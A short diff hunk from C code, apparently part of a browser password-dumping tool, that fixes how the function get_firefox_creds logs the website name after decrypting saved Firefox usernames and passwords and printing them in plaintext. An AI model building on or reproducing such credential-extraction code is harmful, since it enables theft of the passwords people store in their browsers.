@@ -54,7 +54,7 @@ int get_firefox_creds(char *profile_path, char *logins_path, const char *output_
 				decrypt_firefox_cipher(cipher_username->valuestring, &username);
 				decrypt_firefox_cipher(cipher_password->valuestring, &password);
 
-				log_success("Website : %s", hostname);
+				log_success("Website : %s", hostname->valuestring);
 				log_success("Username : %s", username);
 				log_success("Password : %s", password);
 
